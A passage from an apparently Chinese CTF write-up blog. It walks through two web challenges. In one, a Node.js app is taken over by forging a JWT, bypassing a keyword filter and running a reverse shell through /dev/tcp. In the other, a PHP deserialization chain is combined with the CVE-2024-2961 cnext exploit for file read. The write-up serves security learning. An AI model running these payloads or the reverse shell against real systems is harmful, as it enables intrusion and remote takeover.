+</span></span><span class=line><span class=cl>                <span class=nx>merge</span><span class=p>(</span><span class=nx>a</span><span class=p>[</span><span class=nx>c</span><span class=p>],</span> <span class=nx>b</span><span class=p>[</span><span class=nx>c</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=nx>a</span><span class=p>[</span><span class=nx>c</span><span class=p>]</span> <span class=o>=</span> <span class=nx>b</span><span class=p>[</span><span class=nx>c</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>a</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>tmp_user</span><span class=p>.</span><span class=nx>secretKey</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>check</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>(</span><span class=nx>str</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>input</span> <span class=o>=</span> <span class=sr>/const|var|let|return|subprocess|Array|constructor|load|push|mainModule|from|buffer|process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base|&#34;|&#39;|\\|\[|\+|\*/ig</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>str</span> <span class=o>===</span> <span class=s1>&#39;object&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>str</span> <span class=o>!==</span> <span class=kc>null</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>key</span> <span class=k>in</span> <span class=nx>str</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>check</span><span class=p>(</span><span class=nx>key</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>check</span><span class=p>(</span><span class=nx>str</span><span class=p>[</span><span class=nx>key</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>!</span><span class=nx>input</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>str</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>};</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>render</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>});</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>merge</span><span class=p>(</span><span class=nx>tmp_user</span><span class=p>,</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>tmp_user</span><span class=p>.</span><span class=nx>secretKey</span> <span class=o>==</span> <span class=kc>undefined</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>tmp_user</span><span class=p>.</span><span class=nx>secretKey</span> <span class=o>=</span> <span class=nx>crypto</span><span class=p>.</span><span class=nx>randomBytes</span><span class=p>(</span><span class=mi>16</span><span class=p>).</span><span class=nx>toString</span><span class=p>(</span><span class=s1>&#39;hex&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>User</span><span class=p>.</span><span class=nx>verifyLogin</span><span class=p>(</span><span class=nx>tmp_user</span><span class=p>.</span><span class=nx>password</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=kr>const</span> <span class=nx>token</span> <span class=o>=</span> <span class=nx>jwt</span><span class=p>.</span><span class=nx>sign</span><span class=p>({</span> <span class=nx>username</span><span class=o>:</span> <span class=nx>tmp_user</span><span class=p>.</span><span class=nx>username</span> <span class=p>},</span> <span class=nx>tmp_user</span><span class=p>.</span><span class=nx>secretKey</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=sb>`Login successful! Token: </span><span class=si>${</span><span class=nx>token</span><span class=si>}</span><span class=sb>\nBut nothing happend~`</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s1>&#39;Login failed!&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;Hacker denied!&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>});</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>authenticateToken</span><span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>backcode</span> <span class=o>=</span> <span class=nb>eval</span><span class=p>(</span><span class=nx>tmp_user</span><span class=p>.</span><span class=nx>code</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;something happend~&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>});</span>
+</span></span><span class=line><span class=cl><span class=p>});</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>listen</span><span class=p>(</span><span class=nx>port</span><span class=p>,</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`Server running at http://localhost:</span><span class=si>${</span><span class=nx>port</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>});</span>
+</span></span></code></pre></td></tr></table></div></div><p>本来以为是原型链污染，结果仔细看了下merge的时候直接改就行，不用原型链</p><p>首先注意到<code>authenticateToken</code>函数只是单纯验证secretKey，而secretKey是我们可以修改的，因此我们可以先发包修改secretKey：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>username=admin&amp;password=123456&amp;secretKey=1234
+</span></span></code></pre></td></tr></table></div></div><p>然后用自己的key生成一个jwt：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImsxdGUifQ.Pzma-LxIRrefIx88I6DLGsUz7Mh1Syc5b5WodL59AlE
+</span></span></code></pre></td></tr></table></div></div><p>然后拿这个jwt通过<code>authenticateToken</code>函数即可:</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20241112194916555.png loading=lazy></p><p>接着是绕过<code>check</code>函数，只需要对其进行覆盖即可：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>code=check=(str)=&gt;true;
+</span></span></code></pre></td></tr></table></div></div><p>使用payload<code>require('child_process').execSync('sleep 3')</code>可以确定已经rce了</p><p>最后因为没有回显，反弹shell：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>code=require(&#39;child_process&#39;).execSync(&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/xxx/8888 0&gt;&amp;1&#34;&#39;)
+</span></span></code></pre></td></tr></table></div></div><h3 id=fileread>fileread</h3><p>给源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>cls1</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$cls</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$arr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>show</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>foreach</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>arr</span> <span class=k>as</span> <span class=nv>$k</span> <span class=o>=&gt;</span> <span class=nv>$v</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cls</span><span class=o>-&gt;</span><span class=nv>$v</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>cls2</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$filename</span> <span class=o>=</span> <span class=s1>&#39;hello.php&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$txt</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$key</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>           <span class=nx>var_dump</span><span class=p>(</span><span class=nv>$key</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$key</span> <span class=o>==</span> <span class=s1>&#39;fileput&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>fileput</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s1>&#39;&lt;p&gt;&#39;</span><span class=o>.</span><span class=nx>htmlspecialchars</span><span class=p>(</span><span class=nv>$key</span><span class=p>)</span><span class=o>.</span><span class=s1>&#39;&lt;/p&gt;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>fileput</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s1>&#39;Your file:&#39;</span><span class=o>.</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$cls</span> <span class=o>=</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;ser&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$instance</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$cls</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>cls1</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$a</span><span class=o>-&gt;</span><span class=na>show</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>首先是一个简单的反序列化，链子：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cls1-&gt;__wakeup()==&gt;cls2-&gt;__get()==&gt;cls2-&gt;fileput()
+</span></span></code></pre></td></tr></table></div></div><p>反序列化脚本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>cls1</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$cls</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$arr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$filename</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cls</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>cls2</span><span class=p>(</span><span class=nv>$filename</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>arr</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;fileput&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>show</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>foreach</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>arr</span> <span class=k>as</span> <span class=nv>$k</span> <span class=o>=&gt;</span> <span class=nv>$v</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cls</span><span class=o>-&gt;</span><span class=nv>$v</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>cls2</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$filename</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$txt</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$filename</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>=</span> <span class=nv>$filename</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$key</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>var_dump</span><span class=p>(</span><span class=nv>$key</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$key</span> <span class=o>==</span> <span class=s1>&#39;fileput&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>fileput</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s1>&#39;&lt;p&gt;&#39;</span><span class=o>.</span><span class=nx>htmlspecialchars</span><span class=p>(</span><span class=nv>$key</span><span class=p>)</span><span class=o>.</span><span class=s1>&#39;&lt;/p&gt;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>fileput</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s1>&#39;Your file:&#39;</span><span class=o>.</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// if(!empty($_GET)){
+</span></span></span><span class=line><span class=cl><span class=c1>//     $cls = base64_decode($_GET[&#39;ser&#39;]);
+</span></span></span><span class=line><span class=cl><span class=c1>//     $instance = unserialize($cls);
+</span></span></span><span class=line><span class=cl><span class=c1>// }else{
+</span></span></span><span class=line><span class=cl><span class=c1>//     $a = new cls1();
+</span></span></span><span class=line><span class=cl><span class=c1>//     $a-&gt;show();
+</span></span></span><span class=line><span class=cl><span class=c1>// }
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$argc</span> <span class=o>===</span> <span class=mi>1</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$filename</span> <span class=o>=</span> <span class=nv>$argv</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>cls1</span><span class=p>(</span><span class=nv>$filename</span><span class=p>)));</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>打过去发现没权限，使用cnext，参考<a class=link href=https://github.com/vulhub/vulhub/blob/master/php/CVE-2024-2961/README.zh-cn.md target=_blank rel=noopener>vulhub/php/CVE-2024-2961/README.zh-cn.md at master · vulhub/vulhub</a>，exp来自：https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py，这里只修改了Remote类：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>class</span> <span class=nc>Remote</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;A helper class to send the payload and download files.
+</span></span></span><span class=line><span class=cl><span class=s2>    
+</span></span></span><span class=line><span class=cl><span class=s2>    The logic of the exploit is always the same, but the exploit needs to know how to
+</span></span></span><span class=line><span class=cl><span class=s2>    download files (/proc/self/maps and libc) and how to send the payload.
+</span></span></span><span class=line><span class=cl><span class=s2>    
+</span></span></span><span class=line><span class=cl><span class=s2>    The code here serves as an example that attacks a page that looks like:
+</span></span></span><span class=line><span class=cl><span class=s2>    
+</span></span></span><span class=line><span class=cl><span class=s2>    `php
+</span></span></span><span class=line><span class=cl><span class=s2>    &lt;?php
+</span></span></span><span class=line><span class=cl><span class=s2>    
+</span></span></span><span class=line><span class=cl><span class=s2>    $data = file_get_contents($_POST[&#39;file&#39;]);
+</span></span></span><span class=line><span class=cl><span class=s2>    echo &#34;File contents: $data&#34;;
+</span></span></span><span class=line><span class=cl><span class=s2>    `
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>    Tweak it to fit your target, and start the exploit.
+</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>url</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>url</span> <span class=o>=</span> <span class=n>url</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>session</span> <span class=o>=</span> <span class=n>Session</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>send</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>path</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Response</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Sends given `path` to the HTTP server. Returns the response.
+</span></span></span><span class=line><span class=cl><span class=s2>        &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=c1># return self.session.post(self.url, data={&#34;file&#34;: path})</span>
+</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>([</span><span class=s1>&#39;php&#39;</span><span class=p>,</span> <span class=s1>&#39;ser.php&#39;</span><span class=p>,</span> <span class=n>path</span><span class=p>],</span> <span class=n>capture_output</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>text</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=c1># print(result)</span>
+</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=n>result</span><span class=o>.</span><span class=n>stdout</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>url</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;ser&#34;</span><span class=p>:</span> <span class=n>payload</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>download</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>path</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Returns the contents of a remote file.
+</span></span></span><span class=line><span class=cl><span class=s2>        &#34;&#34;&#34;</span>
